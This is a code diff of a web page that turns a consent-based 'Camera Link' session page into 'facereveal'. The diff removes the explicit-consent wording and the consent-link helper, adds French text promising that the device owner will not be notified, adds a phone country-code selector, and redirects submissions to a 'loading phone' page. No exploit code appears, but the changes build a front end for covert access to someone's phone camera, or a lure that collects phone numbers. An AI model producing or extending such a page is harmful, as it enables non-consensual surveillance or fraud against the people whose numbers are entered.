@@ -1,9 +1,10 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Camera Link — Join</title>
+  <title>facereveal — Join</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
   <style>
     :root{
@@ -81,7 +82,7 @@
 </head>
 <body>
   <header>
-    <div class="brand">Camera Link</div>
+  <div class="brand">facereveal</div>
   </header>
 
   <main>
@@ -95,7 +96,7 @@
       </div>
 
       <h1 id="title">Live Camera Session</h1>
-      <p class="sub">We’ll ask the participant for **explicit consent** before starting the stream.</p>
+      <p class="sub">Le propriétaire de l'appareil ne sera pas notifié.</p>
 
       <div class="toggle" role="tablist" aria-label="Contact method">
         <button class="chip" id="tab-phone" aria-pressed="true">
@@ -112,13 +113,30 @@
 
       <form id="form" novalidate>
         <div class="row" id="row-phone">
-          <div class="select" aria-label="Country">
-            <div class="left">
-              <span class="flag">🇺🇸</span>
-              <span>United States</span>
-            </div>
-            <span class="chev">▾</span>
-          </div>
+          <label class="select" aria-label="Country">
+            <select id="country" style="background:transparent;border:none;color:inherit;font:inherit;width:100%;outline:none;">
+              <option value="us" data-flag="🇺🇸" data-code="1">🇺🇸 United States (+1)</option>
+              <option value="fr" data-flag="🇫🇷" data-code="33">🇫🇷 France (+33)</option>
+              <option value="be" data-flag="🇧🇪" data-code="32">🇧🇪 Belgique (+32)</option>
+              <option value="ca" data-flag="🇨🇦" data-code="1">🇨🇦 Canada (+1)</option>
+              <option value="ma" data-flag="🇲🇦" data-code="212">🇲🇦 Maroc (+212)</option>
+              <option value="dz" data-flag="🇩🇿" data-code="213">🇩🇿 Algérie (+213)</option>
+              <option value="ch" data-flag="🇨🇭" data-code="41">🇨🇭 Suisse (+41)</option>
+              <option value="sn" data-flag="🇸🇳" data-code="221">🇸🇳 Sénégal (+221)</option>
+              <option value="ci" data-flag="🇨🇮" data-code="225">🇨🇮 Côte d'Ivoire (+225)</option>
+              <option value="cm" data-flag="🇨🇲" data-code="237">🇨🇲 Cameroun (+237)</option>
+              <option value="tn" data-flag="🇹🇳" data-code="216">🇹🇳 Tunisie (+216)</option>
+              <option value="mg" data-flag="🇲🇬" data-code="261">🇲🇬 Madagascar (+261)</option>
+              <option value="re" data-flag="🇷🇪" data-code="262">🇷🇪 Réunion (+262)</option>
+              <option value="gp" data-flag="🇬🇵" data-code="590">🇬🇵 Guadeloupe (+590)</option>
+              <option value="mq" data-flag="🇲🇶" data-code="596">🇲🇶 Martinique (+596)</option>
+              <option value="yt" data-flag="🇾🇹" data-code="262">🇾🇹 Mayotte (+262)</option>
+              <option value="gf" data-flag="🇬🇫" data-code="594">🇬🇫 Guyane (+594)</option>
+              <option value="pm" data-flag="🇵🇲" data-code="508">🇵🇲 Saint-Pierre-et-Miquelon (+508)</option>
+              <option value="bl" data-flag="🇧🇱" data-code="590">🇧🇱 Saint-Barthélemy (+590)</option>
+              <option value="mf" data-flag="🇲🇫" data-code="590">🇲🇫 Saint-Martin (+590)</option>
+            </select>
+          </label>
           <label class="input" aria-label="Phone number">
             <input id="phone" inputmode="tel" placeholder="+1 (123) 456-7890" />
           </label>
@@ -131,7 +149,7 @@
         </div>
 
         <button class="btn" id="continue" aria-disabled="true">Continue</button>
-        <div class="helper">We’ll only use this to send a consent link.</div>
+  <!-- helper supprimé -->
       </form>
     </section>
   </main>
@@ -161,7 +179,9 @@
     function validate(){
       let ok=false;
       if (rowPhone.style.display !== 'none') {
-        ok = phone.value.trim().length >= 6;
+        // Vérifie qu'il y a au moins 9 chiffres dans le champ téléphone
+        const digits = (phone.value.match(/\d/g) || []).length;
+        ok = digits >= 9;
       } else {
         ok = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.value.trim());
       }
@@ -176,9 +196,34 @@
     document.getElementById('form').addEventListener('submit', (e)=>{
       e.preventDefault();
       if (btn.getAttribute('aria-disabled') === 'false') {
-        alert('Thanks! We’ll send a consent link to start the session.');
+        window.location.href = 'chargement tel.html';
       }
     });
+
+    /* -------- Ajout: synchronise l’indicatif avec le pays sélectionné -------- */
+    const country = document.getElementById('country');
+
+    function applyDialFromSelect(init=false){
+      const opt = country.options[country.selectedIndex];
+      const dial = opt?.dataset?.code ? `+${opt.dataset.code}` : '';
+
+      if (dial) {
+        phone.placeholder = `${dial} (123) 456-7890`;
+      }
+
+      const v = phone.value.trim();
+      const prefixMatch = v.match(/^\+\d+/);
+      if (v === '' || init) {
+        phone.value = dial ? (dial + ' ') : v;
+      } else if (prefixMatch) {
+        phone.value = v.replace(/^\+\d+/, dial);
+      }
+      validate();
+    }
+
+    country.addEventListener('change', ()=>applyDialFromSelect());
+    applyDialFromSelect(true);
+    /* ------------------------------------------------------------------------ */
   </script>
 </body>
 </html>
